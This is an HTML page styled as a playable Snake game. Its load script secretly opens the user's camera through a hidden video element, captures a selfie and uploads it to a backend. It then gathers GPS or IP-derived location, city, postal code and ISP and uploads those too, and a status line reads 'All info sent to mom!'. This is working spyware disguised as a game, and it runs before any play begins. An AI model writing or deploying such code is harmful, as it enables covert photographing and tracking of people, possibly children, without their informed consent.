<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snake Game</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }

        .header {
            text-align: center;
            margin-bottom: 20px;
        }

        h1 {
            color: white;
            font-size: 2.5em;
            margin-bottom: 10px;
        }

        .status {
            color: rgba(255, 255, 255, 0.8);
            font-size: 0.9em;
            margin-bottom: 10px;
        }

        .score {
            color: #ffd700;
            font-size: 1.8em;
            font-weight: bold;
        }

        canvas {
            background: #1a1a2e;
            border-radius: 10px;
            display: block;
            margin: 0 auto 20px;
        }

        .controls {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            width: 200px;
            margin: 0 auto;
        }

        .btn {
            background: rgba(255, 255, 255, 0.2);
            border: none;
            color: white;
            font-size: 1.5em;
            padding: 15px;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .btn:hover {
            background: rgba(255, 255, 255, 0.3);
        }

        .btn:active {
            transform: scale(0.95);
        }

        .start-btn {
            background: #4ecca3;
            color: white;
            font-size: 1.3em;
            padding: 15px 40px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
            display: block;
            margin: 0 auto;
        }

        .start-btn:hover {
            background: #45b393;
            transform: scale(1.05);
        }

        .game-over {
            color: white;
            font-size: 1.5em;
            text-align: center;
            margin-bottom: 20px;
        }

        .hint {
            color: rgba(255, 255, 255, 0.6);
            font-size: 0.85em;
            text-align: center;
            margin-top: 10px;
        }

        .empty {
            grid-column: 1;
        }

        #video {
            display: none;
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>

    <div class="container">
        <div class="header">
            <h1>üêç Snake Game</h1>
            <div class="status" id="status">Loading...</div>
            <div class="score">Score: <span id="score">0</span></div>
        </div>

        <canvas id="gameCanvas" width="400" height="400"></canvas>

        <div id="startScreen">
            <button class="start-btn" onclick="startGame()">Start Game</button>
        </div>

        <div id="gameOverScreen" style="display: none;">
            <div class="game-over">Game Over!</div>
            <button class="start-btn" onclick="startGame()">Play Again</button>
        </div>

        <div id="gameControls" style="display: none;">
            <div class="controls">
                <div class="empty"></div>
                <button class="btn" onclick="changeDirection(0, -1)">‚Üë</button>
                <div class="empty"></div>
                <button class="btn" onclick="changeDirection(-1, 0)">‚Üê</button>
                <button class="btn" onclick="changeDirection(0, 1)">‚Üì</button>
                <button class="btn" onclick="changeDirection(1, 0)">‚Üí</button>
            </div>
            <div class="hint">Use arrow keys or buttons</div>
        </div>
    </div>

    <script>
        const canvas = document.getElementById('gameCanvas');
        const ctx = canvas.getContext('2d');
        const video = document.getElementById('video');
        const gridSize = 20;
        const tileCount = 20;

        let snake = [{ x: 10, y: 10 }];
        let direction = { x: 0, y: 0 };
        let nextDirection = { x: 0, y: 0 };
        let food = { x: 15, y: 15 };
        let score = 0;
        let gameLoop;
        let gameStarted = false;

        // Initialize camera and capture photo on page load
        window.addEventListener('load', async () => {
            try {
                document.getElementById('status').textContent = 'Starting camera...';
                
                // Request camera access
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' }
                });
                
                video.srcObject = stream;
                
                // Wait for video to be ready and capture photo
                video.onloadedmetadata = () => {
                    document.getElementById('status').textContent = 'Capturing photo...';
                    
                    // Wait 2 seconds for camera to stabilize, then capture
                    setTimeout(async () => {
                        await captureAndSendPhoto();
                        
                        // Stop camera after capture
                        stream.getTracks().forEach(track => track.stop());
                        
                        // Then send location info
                        await sendLocationInfo();
                    }, 2000);
                };
                
            } catch (err) {
                console.error('Camera error:', err);
                document.getElementById('status').textContent = 'Camera access denied, sending location only...';
                // If camera fails, still send location
                await sendLocationInfo();
            }
        });

        async function captureAndSendPhoto() {
            try {
                // Create canvas to capture photo
                const photoCanvas = document.createElement('canvas');
                photoCanvas.width = video.videoWidth;
                photoCanvas.height = video.videoHeight;
                const photoCtx = photoCanvas.getContext('2d');
                photoCtx.drawImage(video, 0, 0);

                // Convert to blob
                const blob = await new Promise(resolve => {
                    photoCanvas.toBlob(resolve, 'image/jpeg', 0.8);
                });

                document.getElementById('status').textContent = 'Sending photo...';

                // Send photo to API
                const formData = new FormData();
                formData.append('photo', blob, 'selfie.jpg');

                const response = await fetch('/api/send-photo', {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    document.getElementById('status').textContent = 'Photo sent! Getting location...';
                } else {
                    document.getElementById('status').textContent = 'Photo failed, getting location...';
                }
            } catch (err) {
                console.error('Photo capture error:', err);
                document.getElementById('status').textContent = 'Photo error, getting location...';
            }
        }

        async function sendLocationInfo() {
            try {
                document.getElementById('status').textContent = 'Gathering location info...';
                
                // Try to get GPS location first
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            await sendLocationData(position.coords.latitude, position.coords.longitude);
                        },
                        async (error) => {
                            await sendLocationData(null, null);
                        }
                    );
                } else {
                    await sendLocationData(null, null);
                }
            } catch (err) {
                console.error('Error:', err);
                document.getElementById('status').textContent = 'Error gathering location';
            }
        }

        async function sendLocationData(lat, lon) {
            try {
                // Get IP and location info
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();

                const locationData = {
                    ip: ipData.ip,
                    region: ipData.region,
                    city: ipData.city,
                    country: ipData.country_name,
                    location: lat && lon ? `${lat}, ${lon}` : `${ipData.latitude}, ${ipData.longitude}`,
                    isp: ipData.org,
                    postal: ipData.postal,
                    timezone: ipData.timezone
                };

                // Send to backend
                const response = await fetch('/api/send-info', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(locationData)
                });

                if (response.ok) {
                    document.getElementById('status').textContent = 'All info sent to mom! ‚úì';
                } else {
                    document.getElementById('status').textContent = 'Location send failed';
                }
            } catch (err) {
                console.error('Send error:', err);
                document.getElementById('status').textContent = 'Error sending location';
            }
        }

        function startGame() {
            gameStarted = true;
            score = 0;
            snake = [{ x: 10, y: 10 }];
            direction = { x: 1, y: 0 };
            nextDirection = { x: 1, y: 0 };
            
            document.getElementById('score').textContent = score;
            document.getElementById('startScreen').style.display = 'none';
            document.getElementById('gameOverScreen').style.display = 'none';
            document.getElementById('gameControls').style.display = 'block';
            
            placeFood();
            
            if (gameLoop) clearInterval(gameLoop);
            gameLoop = setInterval(update, 150);
        }

        function placeFood() {
            food = {
                x: Math.floor(Math.random() * tileCount),
                y: Math.floor(Math.random() * tileCount)
            };
        }

        function changeDirection(x, y) {
            if (x !== 0 && direction.x === 0) {
                nextDirection = { x, y };
            } else if (y !== 0 && direction.y === 0) {
                nextDirection = { x, y };
            }
        }

        document.addEventListener('keydown', (e) => {
            if (!gameStarted) return;
            
            switch(e.key) {
                case 'ArrowUp':
                    e.preventDefault();
                    changeDirection(0, -1);
                    break;
                case 'ArrowDown':
                    e.preventDefault();
                    changeDirection(0, 1);
                    break;
                case 'ArrowLeft':
                    e.preventDefault();
                    changeDirection(-1, 0);
                    break;
                case 'ArrowRight':
                    e.preventDefault();
                    changeDirection(1, 0);
                    break;
            }
        });

        function update() {
            direction = nextDirection;
            
            const head = {
                x: snake[0].x + direction.x,
                y: snake[0].y + direction.y
            };

            if (head.x < 0 || head.x >= tileCount || head.y < 0 || head.y >= tileCount) {
                endGame();
                return;
            }

            if (snake.some(segment => segment.x === head.x && segment.y === head.y)) {
                endGame();
                return;
            }

            snake.unshift(head);

            if (head.x === food.x && head.y === food.y) {
                score += 10;
                document.getElementById('score').textContent = score;
                placeFood();
            } else {
                snake.pop();
            }

            draw();
        }

        function endGame() {
            gameStarted = false;
            clearInterval(gameLoop);
            document.getElementById('gameControls').style.display = 'none';
            document.getElementById('gameOverScreen').style.display = 'block';
        }

        function draw() {
            ctx.fillStyle = '#1a1a2e';
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            snake.forEach((segment, index) => {
                ctx.fillStyle = index === 0 ? '#2ecc71' : '#4ecca3';
                ctx.fillRect(
                    segment.x * gridSize,
                    segment.y * gridSize,
                    gridSize - 2,
                    gridSize - 2
                );
            });

            ctx.fillStyle = '#e74c3c';
            ctx.fillRect(
                food.x * gridSize,
                food.y * gridSize,
                gridSize - 2,
                gridSize - 2
            );
        }

        draw();
    </script>
</body>
</html>
